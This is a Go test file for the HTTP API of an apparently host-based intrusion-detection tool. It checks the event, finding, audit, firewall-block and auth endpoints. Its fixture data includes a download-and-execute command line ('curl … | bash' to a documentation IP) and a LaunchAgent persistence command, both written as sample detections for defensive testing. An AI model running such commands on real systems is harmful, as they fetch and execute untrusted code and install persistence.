package api

// api_test.go —— 端点契约测试。
//
// 用真的 *store.Store（MemoryOnly + 临时目录的审计链）起 httptest 服务，
// 不用 mock：这一层的价值就是「存储里的东西经过 API 之后字段还对不对」，
// mock 掉存储等于把要测的东西测没了。

import (
	"bufio"
	"context"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/Kur1sulab/atfield/go/internal/enforcer"
	"github.com/Kur1sulab/atfield/go/internal/model"
	"github.com/Kur1sulab/atfield/go/internal/store"
	"github.com/Kur1sulab/atfield/go/internal/webui"
)

// ---------------- 夹具 ----------------

// fixture 一套可用的服务 + 依赖。
type fixture struct {
	srv   *Server
	store *store.Store
	audit *store.AuditLog
	ts    *httptest.Server
}

func newFixture(t *testing.T, tune func(*Config)) *fixture {
	t.Helper()
	dir := t.TempDir()
	st, err := store.New(store.Config{DataDir: dir})
	if err != nil {
		t.Fatalf("store.New: %v", err)
	}
	t.Cleanup(func() { _ = st.Close() })

	auditCfg := store.DefaultAuditConfig()
	auditCfg.Dir = filepath.Join(dir, "audit") // 测试写在临时目录，绝不碰 ~/.atfield
	log, err := store.OpenAudit(auditCfg)
	if err != nil {
		t.Fatalf("OpenAudit: %v", err)
	}
	st.AttachAudit(log)
	t.Cleanup(func() { _ = log.Close() })

	cfg := Config{
		Store: st, Audit: log, Version: "test-1.0",
		Host: "testhost", User: "tester",
		Now: func() time.Time { return time.Unix(1700000000, 0) },
	}
	if tune != nil {
		tune(&cfg)
	}
	s := New(cfg)
	f := &fixture{srv: s, store: st, audit: log}
	f.ts = httptest.NewServer(s.Handler())
	t.Cleanup(f.ts.Close)
	return f
}

// get 发一个 GET 并返回状态码 + 解码后的对象。
func (f *fixture) get(t *testing.T, path string) (int, map[string]any) {
	t.Helper()
	resp, err := http.Get(f.ts.URL + path)
	if err != nil {
		t.Fatalf("GET %s: %v", path, err)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	var obj map[string]any
	if err := json.Unmarshal(body, &obj); err != nil {
		t.Fatalf("GET %s 返回非 JSON: %s", path, body)
	}
	return resp.StatusCode, obj
}

// post 发一个 POST（默认带 CSRF 头）。
func (f *fixture) post(t *testing.T, path string, body string, csrf bool) (int, map[string]any) {
	t.Helper()
	req, _ := http.NewRequest(http.MethodPost, f.ts.URL+path, strings.NewReader(body))
	if csrf {
		req.Header.Set(csrfHeader, csrfValue)
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatalf("POST %s: %v", path, err)
	}
	defer resp.Body.Close()
	raw, _ := io.ReadAll(resp.Body)
	var obj map[string]any
	_ = json.Unmarshal(raw, &obj)
	return resp.StatusCode, obj
}

// seed 灌入事件/告警/攻击链/工单/动作。
func seed(t *testing.T, st *store.Store) {
	t.Helper()
	now := 1700000000.0
	var evs []model.Event
	for i := 0; i < 30; i++ {
		pid := 1000 + i
		evs = append(evs, model.Event{
			Kind:     "process.start",
			Source:   "test",
			TS:       now - float64(i),
			Host:     "testhost",
			User:     "alice",
			PID:      &pid,
			Process:  "curl",
			Cmdline:  "curl -fsSL http://198.51.100.7/x.sh | bash",
			Path:     "/usr/bin/curl",
			Severity: "medium",
			Subject:  map[string]any{"suspicious_path": true, "label": "com.evil.agent"},
			EID:      "eid-" + itoa(i),
		})
	}
	// 一条高危 + 一条 info，用于验证 min_sev 过滤
	evs = append(evs, model.Event{
		Kind: "persistence.add", Source: "test", TS: now, Host: "testhost", User: "bob",
		Process: "launchctl", Cmdline: "launchctl load ~/Library/LaunchAgents/evil.plist",
		Path: "/Users/bob/Library/LaunchAgents/evil.plist", Severity: "critical",
		EID: "eid-critical",
	})
	evs = append(evs, model.Event{
		Kind: "net.listen", Source: "test", TS: now, Host: "testhost", User: "",
		Process: "nginx", Severity: "info", EID: "eid-info",
	})
	if err := st.AddEvents(evs); err != nil {
		t.Fatalf("AddEvents: %v", err)
	}

	fs := []*model.Finding{{
		ID: "fid-1", RuleID: "proc.curl_pipe_sh", Name: "下载即执行",
		Severity: "high", Status: "open", TS: now - 5, Count: 3,
		DedupKey: "proc.curl_pipe_sh|alice|curl|/usr/bin/curl",
		Actor:    "alice", Detail: "curl | bash", Advice: "确认来源",
		MITRE: []string{"T1059.004"}, Tags: []string{"exec"},
		EventID: "eid-0", FirstTS: now - 50, LastTS: now - 5,
		FirstDetail: "首见", LastDetail: "末见",
	}}
	if _, _, err := st.AddFindings(fs); err != nil {
		t.Fatalf("AddFindings: %v", err)
	}
	if err := st.AddIncident(model.Incident{
		ID: "iid-1", Title: "可疑下载链", Severity: "high", TS: now - 3,
		Findings: []string{"fid-1"}, Summary: "curl 管道执行",
	}); err != nil {
		t.Fatalf("AddIncident: %v", err)
	}
	if _, err := st.CreateTicket("处置 curl 告警", "high", "fid-1", "详情", "api"); err != nil {
		t.Fatalf("CreateTicket: %v", err)
	}
	st.LogAction("alice", "process.kill", "pid 1234", "ok")
	st.SetState("baseline", map[string]any{
		"results": []any{
			map[string]any{"name": "磁盘加密", "category": "数据保护", "status": "fail", "weight": 3},
			map[string]any{"name": "防火墙", "category": "网络防线", "status": "pass", "weight": 2},
		},
		"counts": map[string]any{"pass": 1, "fail": 1, "unknown": 2},
	})
}

// ---------------- 基础端点 ----------------

func TestPing(t *testing.T) {
	f := newFixture(t, nil)
	code, obj := f.get(t, "/api/ping")
	if code != 200 {
		t.Fatalf("状态码=%d", code)
	}
	if obj["ok"] != true || obj["version"] != "test-1.0" {
		t.Fatalf("body=%v", obj)
	}
	if _, ok := obj["ts"].(float64); !ok {
		t.Fatalf("ts 不是数字: %v", obj["ts"])
	}
}

func TestVersion(t *testing.T) {
	f := newFixture(t, nil)
	code, obj := f.get(t, "/api/version")
	if code != 200 {
		t.Fatalf("状态码=%d", code)
	}
	for _, k := range []string{"name", "version", "go", "executable", "platform", "themes", "ts"} {
		if _, ok := obj[k]; !ok {
			t.Fatalf("缺少字段 %q: %v", k, obj)
		}
	}
	if obj["name"] != Product {
		t.Fatalf("name=%v", obj["name"])
	}
	themes, _ := obj["themes"].([]any)
	if len(themes) != 2 {
		t.Fatalf("themes=%v", obj["themes"])
	}
}

func TestMethodNotAllowed(t *testing.T) {
	f := newFixture(t, nil)
	resp, err := http.Post(f.ts.URL+"/api/ping", "application/json", strings.NewReader("{}"))
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusMethodNotAllowed {
		t.Fatalf("POST /api/ping 状态=%d, 期望 405", resp.StatusCode)
	}
}

// ---------------- 事件 ----------------

func TestEventsDefaultLimitAndShape(t *testing.T) {
	f := newFixture(t, nil)
	seed(t, f.store)

	code, obj := f.get(t, "/api/events")
	if code != 200 {
		t.Fatalf("状态码=%d", code)
	}
	arr, _ := obj["events"].([]any)
	if len(arr) != 32 {
		t.Fatalf("返回 %d 条，期望 32（全部）", len(arr))
	}
	// 最新在前
	first := arr[0].(map[string]any)
	if first["eid"] != "eid-info" {
		t.Fatalf("首条不是最新事件: %v", first["eid"])
	}
	// 字段全集（Python Event.to_dict 的键）
	for _, k := range []string{"kind", "source", "ts", "host", "user", "pid", "ppid",
		"process", "cmdline", "path", "severity", "subject", "raw", "eid",
		"time", "clock", "severity_cn", "text"} {
		if _, ok := first[k]; !ok {
			t.Fatalf("事件缺少字段 %q: %v", k, first)
		}
	}
	if first["severity_cn"] != "信息" {
		t.Fatalf("severity_cn=%v", first["severity_cn"])
	}
	if first["time"] == "" || first["clock"] == "" {
		t.Fatalf("time/clock 未填充: %v %v", first["time"], first["clock"])
	}
	// text 要包含 process/cmdline（Python text = kind+process+cmdline+path+user+pid+host）
	third := arr[2].(map[string]any)
	if !strings.Contains(third["text"].(string), "curl") {
		t.Fatalf("text 不含 process: %v", third["text"])
	}
	// 也拼 subject 的**值**（不拼键，与 Python 一致）
	if !strings.Contains(third["text"].(string), "com.evil.agent") {
		t.Fatalf("text 不含 subject 值: %v", third["text"])
	}
}

func TestEventsLimit(t *testing.T) {
	f := newFixture(t, nil)
	seed(t, f.store)
	_, obj := f.get(t, "/api/events?limit=5")
	if n := len(obj["events"].([]any)); n != 5 {
		t.Fatalf("limit=5 返回 %d 条", n)
	}
	_, obj = f.get(t, "/api/events?limit=0")
	if n := len(obj["events"].([]any)); n != 0 {
		t.Fatalf("limit=0 应返回空列表，实际 %d 条", n)
	}
}

func TestEventsKindFilter(t *testing.T) {
	f := newFixture(t, nil)
	seed(t, f.store)
	_, obj := f.get(t, "/api/events?kind=persistence.add")
	arr := obj["events"].([]any)
	if len(arr) != 1 {
		t.Fatalf("kind 过滤返回 %d 条", len(arr))
	}
	if arr[0].(map[string]any)["eid"] != "eid-critical" {
		t.Fatalf("过滤结果不对: %v", arr[0])
	}
}

func TestEventsMinSevFilter(t *testing.T) {
	f := newFixture(t, nil)
	seed(t, f.store)
	_, obj := f.get(t, "/api/events?min_sev=high")
	arr := obj["events"].([]any)
	if len(arr) != 1 {
		t.Fatalf("min_sev=high 返回 %d 条，期望 1（critical）", len(arr))
	}
	if arr[0].(map[string]any)["severity"] != "critical" {
		t.Fatalf("min_sev 过滤把低危也带进来了: %v", arr[0])
	}
}

// TestEventsQMatchesUserAndSubject 钉住「q 按 text 过滤」这条与 Python 对齐的语义：
// store 自己的 q 只查 process/path/cmdline/kind，查不到 user=alice。
func TestEventsQMatchesUserAndSubject(t *testing.T) {
	f := newFixture(t, nil)
	seed(t, f.store)
	_, obj := f.get(t, "/api/events?q=alice")
	if n := len(obj["events"].([]any)); n == 0 {
		t.Fatal("按用户名搜索应有结果（Python 的 text 含 user）")
	}
	_, obj = f.get(t, "/api/events?q=com.evil.agent")
	if n := len(obj["events"].([]any)); n == 0 {
		t.Fatal("按 subject 值搜索应有结果（Python 的 text 含 subject 值）")
	}
	_, obj = f.get(t, "/api/events?q=没有这个词")
	if n := len(obj["events"].([]any)); n != 0 {
		t.Fatalf("无关关键字不该有结果，实际 %d", n)
	}
}

func TestEventsOffsetPagination(t *testing.T) {
	f := newFixture(t, nil)
	seed(t, f.store)
	_, all := f.get(t, "/api/events?limit=10")
	_, page2 := f.get(t, "/api/events?limit=10&offset=10")
	a := all["events"].([]any)
	b := page2["events"].([]any)
	if len(a) != 10 || len(b) != 10 {
		t.Fatalf("分页长度不对: %d / %d", len(a), len(b))
	}
	if a[0].(map[string]any)["eid"] == b[0].(map[string]any)["eid"] {
		t.Fatal("第二页与第一页首条重复")
	}
	// 拼接后应等于前 20 条无重复
	seen := map[string]bool{}
	for _, x := range append(a, b...) {
		id := x.(map[string]any)["eid"].(string)
		if seen[id] {
			t.Fatalf("分页出现重复: %s", id)
		}
		seen[id] = true
	}
}

func TestEventDetail(t *testing.T) {
	f := newFixture(t, nil)
	seed(t, f.store)

	code, obj := f.get(t, "/api/event?eid=eid-critical")
	if code != 200 {
		t.Fatalf("状态码=%d", code)
	}
	ev, ok := obj["event"].(map[string]any)
	if !ok {
		t.Fatalf("缺少 event 对象: %v", obj)
	}
	if ev["eid"] != "eid-critical" || ev["severity"] != "critical" {
		t.Fatalf("详情内容不对: %v", ev)
	}
	if _, ok := ev["text"]; !ok {
		t.Fatal("详情应含 text 字段")
	}

	code, obj = f.get(t, "/api/event?eid=不存在")
	if code != 404 || obj["ok"] != false {
		t.Fatalf("未知 eid 应 404: %d %v", code, obj)
	}
	code, obj = f.get(t, "/api/event")
	if code != 400 {
		t.Fatalf("缺 eid 应 400，实际 %d %v", code, obj)
	}
}

// ---------------- 告警 / 攻击链 / 工单 / 动作 ----------------

func TestFindingsShape(t *testing.T) {
	f := newFixture(t, nil)
	seed(t, f.store)
	code, obj := f.get(t, "/api/findings")
	if code != 200 {
		t.Fatalf("状态码=%d", code)
	}
	arr := obj["findings"].([]any)
	if len(arr) != 1 {
		t.Fatalf("返回 %d 条", len(arr))
	}
	fd := arr[0].(map[string]any)
	// Python 的键是 fid（不是 id）——这一条最容易在迁移里写错
	if fd["fid"] != "fid-1" {
		t.Fatalf("fid=%v", fd["fid"])
	}
	if _, bad := fd["id"]; bad {
		t.Fatal("不应出现 id 键（Python 用 fid）")
	}
	for _, k := range []string{"fid", "rule_id", "name", "severity", "severity_cn", "actor",
		"tags", "mitre", "detail", "advice", "ts", "time", "event", "count",
		"dedup_key", "first_detail", "last_detail", "first_ts", "last_ts"} {
		if _, ok := fd[k]; !ok {
			t.Fatalf("告警缺少字段 %q: %v", k, fd)
		}
	}
	if fd["severity_cn"] != "高危" {
		t.Fatalf("severity_cn=%v", fd["severity_cn"])
	}
	// event 应解析出内嵌事件对象（Python 的 finding 里带 event）
	ev, ok := fd["event"].(map[string]any)
	if !ok {
		t.Fatalf("event 未解析: %v", fd["event"])
	}
	if ev["eid"] != "eid-0" {
		t.Fatalf("内嵌事件 eid=%v", ev["eid"])
	}
}

func TestIncidentsShape(t *testing.T) {
	f := newFixture(t, nil)
	seed(t, f.store)
	_, obj := f.get(t, "/api/incidents")
	arr := obj["incidents"].([]any)
	if len(arr) != 1 {
		t.Fatalf("返回 %d 条", len(arr))
	}
	inc := arr[0].(map[string]any)
	for _, k := range []string{"iid", "title", "severity", "severity_cn", "first_seen",
		"last_seen", "first_time", "last_time", "score", "summary", "stages"} {
		if _, ok := inc[k]; !ok {
			t.Fatalf("攻击链缺少字段 %q: %v", k, inc)
		}
	}
	if inc["iid"] != "iid-1" || inc["severity_cn"] != "高危" {
		t.Fatalf("攻击链内容不对: %v", inc)
	}
}

func TestTicketsActionsTimeline(t *testing.T) {
	f := newFixture(t, nil)
	seed(t, f.store)

	if _, obj := f.get(t, "/api/tickets"); len(obj["tickets"].([]any)) != 1 {
		t.Fatalf("工单数=%v", obj["tickets"])
	}
	_, obj := f.get(t, "/api/actions")
	if len(obj["actions"].([]any)) != 1 {
		t.Fatalf("动作数=%v", obj["actions"])
	}
	act := obj["actions"].([]any)[0].(map[string]any)
	if act["actor"] != "alice" || act["action"] != "process.kill" {
		t.Fatalf("动作内容不对: %v", act)
	}
	_, obj = f.get(t, "/api/timeline")
	if _, ok := obj["timeline"].([]any); !ok {
		t.Fatalf("timeline 不是数组: %v", obj)
	}
}

func TestAssets(t *testing.T) {
	f := newFixture(t, nil)
	seed(t, f.store)
	code, obj := f.get(t, "/api/assets")
	if code != 200 {
		t.Fatalf("状态码=%d", code)
	}
	for _, k := range []string{"processes", "connections", "sessions", "persistence",
		"integrity", "security_sw", "baseline"} {
		m, ok := obj[k].(map[string]any)
		if !ok {
			t.Fatalf("%q 不是对象: %v", k, obj[k])
		}
		if k == "baseline" && m["counts"] == nil {
			t.Fatalf("baseline 未透出: %v", m)
		}
	}
}

func TestRulesEmptyWithoutEngine(t *testing.T) {
	f := newFixture(t, nil)
	_, obj := f.get(t, "/api/rules")
	if _, ok := obj["rules"].([]any); !ok {
		t.Fatalf("rules 不是数组: %v", obj)
	}
	if _, ok := obj["chains"].([]any); !ok {
		t.Fatalf("chains 不是数组（前端会遍历）: %v", obj)
	}
}

// ---------------- 审计 ----------------

func TestAudit(t *testing.T) {
	f := newFixture(t, nil)
	// 写三条不同类型的审计记录
	for _, a := range []string{"firewall.block", "firewall.block", "auth.login"} {
		f.audit.Append(store.AuditInput{Action: a, Actor: "alice", Role: "analyst",
			Target: "198.51.100.7", Result: "ok"})
	}
	code, obj := f.get(t, "/api/audit")
	if code != 200 {
		t.Fatalf("状态码=%d", code)
	}
	for _, k := range []string{"records", "stats", "anchor"} {
		if _, ok := obj[k]; !ok {
			t.Fatalf("缺少字段 %q: %v", k, obj)
		}
	}
	recs := obj["records"].([]any)
	if len(recs) != 3 {
		t.Fatalf("记录数=%d", len(recs))
	}
	// 尾部顺序：最新在前
	if recs[0].(map[string]any)["action"] != "auth.login" {
		t.Fatalf("尾部顺序不对: %v", recs[0])
	}
	// 过滤
	_, obj = f.get(t, "/api/audit?action=firewall.block")
	if n := len(obj["records"].([]any)); n != 2 {
		t.Fatalf("action 过滤后 %d 条", n)
	}
	_, obj = f.get(t, "/api/audit?limit=1")
	if n := len(obj["records"].([]any)); n != 1 {
		t.Fatalf("limit=1 返回 %d 条", n)
	}
	// 链自洽
	rec := recs[0].(map[string]any)
	if rec["hash"] == "" || rec["prev"] == "" {
		t.Fatalf("记录缺少 hash/prev: %v", rec)
	}
}

func TestAuditVerify(t *testing.T) {
	f := newFixture(t, nil)
	f.audit.Append(store.AuditInput{Action: "test", Actor: "alice", Result: "ok"})
	code, obj := f.get(t, "/api/audit/verify")
	if code != 200 {
		t.Fatalf("状态码=%d", code)
	}
	if obj["ok"] != true {
		t.Fatalf("新链应校验通过: %v", obj)
	}
	if _, ok := obj["records"]; !ok {
		t.Fatalf("缺少 records 字段: %v", obj)
	}
}

// ---------------- 统计汇总 ----------------

func TestOverviewShape(t *testing.T) {
	f := newFixture(t, nil)
	seed(t, f.store)

	code, obj := f.get(t, "/api/overview")
	if code != 200 {
		t.Fatalf("状态码=%d", code)
	}
	for _, k := range []string{"product", "version", "host", "user", "platform", "uptime",
		"started_at", "now", "health", "threat", "threat_color", "counters", "totals",
		"collectors", "telemetry", "top_findings", "recent_incidents", "fusion",
		"governance", "verdict"} {
		if _, ok := obj[k]; !ok {
			t.Fatalf("overview 缺少字段 %q", k)
		}
	}
	health := obj["health"].(map[string]any)
	if dims, _ := health["dimensions"].([]any); len(dims) != 5 {
		t.Fatalf("health.dimensions=%d, 期望 5", len(dims))
	}
	if _, ok := health["grade"].(string); !ok {
		t.Fatalf("health.grade 缺失: %v", health)
	}
	threat := obj["threat"].(map[string]any)
	bySev := threat["by_severity"].(map[string]any)
	for _, s := range []string{"info", "low", "medium", "high", "critical"} {
		if _, ok := bySev[s]; !ok {
			t.Fatalf("threat.by_severity 缺 %q: %v", s, bySev)
		}
	}
	if bySev["high"].(float64) != 1 {
		t.Fatalf("high 计数=%v, 期望 1", bySev["high"])
	}
	totals := obj["totals"].(map[string]any)
	for _, k := range []string{"events", "findings", "incidents", "processes", "connections",
		"public_connections", "listeners", "sessions", "persistence", "persistence_suspicious",
		"baseline_fail", "baseline_warn", "integrity_watched", "integrity_missing"} {
		if _, ok := totals[k]; !ok {
			t.Fatalf("totals 缺 %q: %v", k, totals)
		}
	}
	if totals["baseline_fail"].(float64) != 1 {
		t.Fatalf("baseline_fail=%v", totals["baseline_fail"])
	}
	if v, _ := obj["verdict"].(string); !strings.Contains(v, "风险指数") {
		t.Fatalf("verdict 内容不对: %q", v)
	}
	if tc, _ := obj["threat_color"].(string); tc == "" {
		t.Fatal("threat_color 为空")
	}
}

func TestOverviewHealthDegradedByFail(t *testing.T) {
	f := newFixture(t, nil)
	seed(t, f.store)
	_, obj := f.get(t, "/api/overview")
	health := obj["health"].(map[string]any)
	dims := health["dimensions"].([]any)
	var dataDim map[string]any
	for _, d := range dims {
		m := d.(map[string]any)
		if m["key"] == "data" {
			dataDim = m
		}
	}
	if dataDim == nil {
		t.Fatal("缺少 data 维度")
	}
	if dataDim["failed"].(float64) != 1 {
		t.Fatalf("data.failed=%v, 期望 1", dataDim["failed"])
	}
	if dataDim["score"].(float64) != 18 {
		t.Fatalf("data.score=%v, 期望 18（fail 档）", dataDim["score"])
	}
	if dataDim["top_issue"] != "磁盘加密" {
		t.Fatalf("top_issue=%v", dataDim["top_issue"])
	}
}

// ---------------- 静态资源 / 404 ----------------

func TestStaticMounted(t *testing.T) {
	f := newFixture(t, func(c *Config) { c.Web = webui.Handler() })
	resp, err := http.Get(f.ts.URL + "/")
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode != 200 || !strings.Contains(string(body), "<html") {
		t.Fatalf("首页未挂载: %d", resp.StatusCode)
	}
	// API 优先于静态
	code, _ := f.get(t, "/api/ping")
	if code != 200 {
		t.Fatalf("/api/ping 被静态资源抢了: %d", code)
	}
}

func TestUnknownAPIPaths(t *testing.T) {
	// 无静态资源时
	f := newFixture(t, nil)
	code, obj := f.get(t, "/api/nope")
	if code != 404 || obj["error"] != "unknown api" {
		t.Fatalf("未知 API: %d %v", code, obj)
	}
	code, obj = f.get(t, "/random.txt")
	if code != 404 || obj["error"] != "not found" {
		t.Fatalf("未知静态: %d %v", code, obj)
	}

	// 有静态资源时，api/ 前缀仍要 404 unknown api
	f2 := newFixture(t, func(c *Config) { c.Web = webui.Handler() })
	code, obj = f2.get(t, "/api/nope")
	if code != 404 || obj["error"] != "unknown api" {
		t.Fatalf("挂载静态后未知 API: %d %v", code, obj)
	}
}

// ---------------- 封禁执行层 HTTP 面 ----------------

func TestFirewallBlockDryRun(t *testing.T) {
	enf := enforcer.NewPF(enforcer.Options{DryRun: true})
	f := newFixture(t, func(c *Config) { c.Enforcer = enf })

	// 缺 CSRF 头 → 403
	code, obj := f.post(t, "/api/firewall/block", `{"ip":"198.51.100.7"}`, false)
	if code != 403 || !strings.Contains(asStr(obj["error"]), "X-Requested-With") {
		t.Fatalf("缺 CSRF 头应 403: %d %v", code, obj)
	}

	// 非法目标 → 400 + 校验原因
	code, obj = f.post(t, "/api/firewall/block", `{"ip":"127.0.0.1"}`, true)
	if code != 400 || !strings.Contains(asStr(obj["error"]), "回环") {
		t.Fatalf("回环地址应 400: %d %v", code, obj)
	}

	// 正常封禁 → 200 + 命令已构造
	code, obj = f.post(t, "/api/firewall/block", `{"ip":"198.51.100.7","reason":"扫描"}`, true)
	if code != 200 || obj["ok"] != true {
		t.Fatalf("封禁失败: %d %v", code, obj)
	}
	if obj["changed"] != true || obj["dry_run"] != true {
		t.Fatalf("结果标记不对: %v", obj)
	}
	cmds, _ := obj["commands"].([]any)
	if len(cmds) != 2 {
		t.Fatalf("应返回 2 条命令，实际 %d", len(cmds))
	}
	if obj["ip"] != "198.51.100.7/32" {
		t.Fatalf("ip=%v", obj["ip"])
	}

	// 重复封禁 → 409 skipped（Python 同：未启用/无变化不是错误）
	code, obj = f.post(t, "/api/firewall/block", `{"ip":"198.51.100.7"}`, true)
	if code != 409 || obj["skipped"] != true {
		t.Fatalf("重复封禁应 409 skipped: %d %v", code, obj)
	}

	// 审计留痕
	_, audit := f.get(t, "/api/audit?action=firewall.block")
	if n := len(audit["records"].([]any)); n != 2 {
		t.Fatalf("审计记录数=%d, 期望 2（成功 + 跳过各一条）", n)
	}
}

func TestFirewallUnblockFlushStatus(t *testing.T) {
	enf := enforcer.NewPF(enforcer.Options{DryRun: true})
	f := newFixture(t, func(c *Config) { c.Enforcer = enf })

	f.post(t, "/api/firewall/block", `{"ip":"198.51.100.7"}`, true)
	code, obj := f.get(t, "/api/firewall")
	if code != 200 || obj["available"] != true {
		t.Fatalf("firewall status: %d %v", code, obj)
	}
	if obj["count"].(float64) != 1 {
		t.Fatalf("count=%v", obj["count"])
	}
	if blocked, _ := obj["blocked"].([]any); len(blocked) != 1 {
		t.Fatalf("blocked=%v", obj["blocked"])
	}
	if obj["backend"] != "pf" {
		t.Fatalf("backend=%v", obj["backend"])
	}

	code, obj = f.post(t, "/api/firewall/unblock", `{"ip":"198.51.100.7"}`, true)
	if code != 200 || obj["removed"] != true {
		t.Fatalf("解封失败: %d %v", code, obj)
	}

	f.post(t, "/api/firewall/block", `{"ip":"203.0.113.9"}`, true)
	code, obj = f.post(t, "/api/firewall/flush", ``, true)
	if code != 200 || obj["flushed"].(float64) != 1 {
		t.Fatalf("flush 失败: %d %v", code, obj)
	}
}

func TestFirewallNoEnforcer(t *testing.T) {
	f := newFixture(t, nil)
	code, obj := f.get(t, "/api/firewall")
	if code != 200 || obj["available"] != false {
		t.Fatalf("未接执行层应 available=false: %d %v", code, obj)
	}
	if asStr(obj["reason"]) == "" {
		t.Fatal("必须给原因")
	}
	code, obj = f.post(t, "/api/firewall/block", `{"ip":"198.51.100.7"}`, true)
	if code != 400 {
		t.Fatalf("未接执行层时封禁应 400，实际 %d %v", code, obj)
	}
}

// ---------------- 鉴权 ----------------

// fakeAuth 一个极简鉴权实现：只有 token=="good" 且 requireAdmin 时能过。
type fakeAuth struct {
	requireAdmin bool
	denied       int
}

func (a *fakeAuth) Session(token string) *Session {
	if token != "good" {
		return nil
	}
	role := "analyst"
	if !a.requireAdmin {
		role = "admin"
	}
	return &Session{User: "alice", Role: role}
}

func (a *fakeAuth) Caps(role string) []string {
	if role == "admin" {
		return []string{"admin", "read", "respond", "triage"}
	}
	return []string{"read", "triage"}
}

func (a *fakeAuth) Can(role, cap string) bool {
	for _, c := range a.Caps(role) {
		if c == cap {
			return true
		}
	}
	return false
}

func (a *fakeAuth) Enabled() bool { return true }

func TestAuthUnauthorized(t *testing.T) {
	auth := &fakeAuth{}
	f := newFixture(t, func(c *Config) { c.Auth = auth })

	resp, err := http.Get(f.ts.URL + "/api/events")
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	var obj map[string]any
	_ = json.NewDecoder(resp.Body).Decode(&obj)
	if resp.StatusCode != 401 {
		t.Fatalf("无 token 应 401，实际 %d", resp.StatusCode)
	}
	if obj["login_required"] != true {
		t.Fatalf("401 body 缺 login_required: %v", obj)
	}

	// 带 token 放行
	req, _ := http.NewRequest(http.MethodGet, f.ts.URL+"/api/events", nil)
	req.Header.Set("Authorization", "Bearer good")
	resp2, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer resp2.Body.Close()
	if resp2.StatusCode != 200 {
		t.Fatalf("带 token 应 200，实际 %d", resp2.StatusCode)
	}
}

func TestAuthForbidden(t *testing.T) {
	auth := &fakeAuth{requireAdmin: true} // role=analyst，无 respond 能力
	f := newFixture(t, func(c *Config) { c.Auth = auth })
	req, _ := http.NewRequest(http.MethodPost, f.ts.URL+"/api/firewall/block", strings.NewReader(`{"ip":"198.51.100.7"}`))
	req.Header.Set("Authorization", "Bearer good")
	req.Header.Set(csrfHeader, csrfValue)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	var obj map[string]any
	_ = json.NewDecoder(resp.Body).Decode(&obj)
	if resp.StatusCode != 403 {
		t.Fatalf("能力不足应 403，实际 %d", resp.StatusCode)
	}
	if obj["need"] != "respond" {
		t.Fatalf("403 body 缺 need: %v", obj)
	}
	// 拒绝要进审计链：动作 auth.deny、带 need 与 role
	recs := f.audit.Tail(10, "auth.deny", "")
	if len(recs) != 1 {
		t.Fatalf("权限拒绝应写一条 auth.deny，实际 %d 条", len(recs))
	}
	if recs[0].Role != "analyst" || recs[0].Result != "deny" {
		t.Fatalf("拒绝记录内容不对: %+v", recs[0])
	}
	if recs[0].Detail["need"] != "respond" {
		t.Fatalf("拒绝记录 detail.need=%v", recs[0].Detail["need"])
	}
}

func TestAuthMe(t *testing.T) {
	f := newFixture(t, nil)
	_, obj := f.get(t, "/api/auth/me")
	if obj["ok"] != true || obj["role"] != "admin" {
		t.Fatalf("开放模式 auth/me: %v", obj)
	}
	if obj["auth_enabled"] != false {
		t.Fatalf("auth_enabled 应为 false: %v", obj)
	}
	if caps, _ := obj["caps"].([]any); len(caps) != 4 {
		t.Fatalf("caps=%v", obj["caps"])
	}
}

// ---------------- SSE ----------------

// TestStreamFirstFrame 只读第一帧就断开：验证头与 data: 前缀，
// 不真的等 300 秒。
func TestStreamFirstFrame(t *testing.T) {
	f := newFixture(t, nil)
	seed(t, f.store)
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	req, _ := http.NewRequestWithContext(ctx, http.MethodGet, f.ts.URL+"/api/stream", nil)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	if ct := resp.Header.Get("Content-Type"); !strings.HasPrefix(ct, "text/event-stream") {
		t.Fatalf("Content-Type=%q", ct)
	}
	if resp.Header.Get("Cache-Control") != "no-store" {
		t.Fatalf("Cache-Control=%q", resp.Header.Get("Cache-Control"))
	}
	if resp.Header.Get("X-Accel-Buffering") != "no" {
		t.Fatalf("X-Accel-Buffering=%q", resp.Header.Get("X-Accel-Buffering"))
	}
	line, err := bufio.NewReader(resp.Body).ReadString('\n')
	if err != nil {
		t.Fatalf("读首帧失败: %v", err)
	}
	if !strings.HasPrefix(line, "data: ") {
		t.Fatalf("首行=%q, 期望 data: 前缀", line)
	}
	var obj map[string]any
	if err := json.Unmarshal([]byte(strings.TrimPrefix(strings.TrimSpace(line), "data: ")), &obj); err != nil {
		t.Fatalf("首帧不是 JSON: %v", err)
	}
	if obj["product"] != Product {
		t.Fatalf("首帧不是 overview: %v", obj["product"])
	}
}
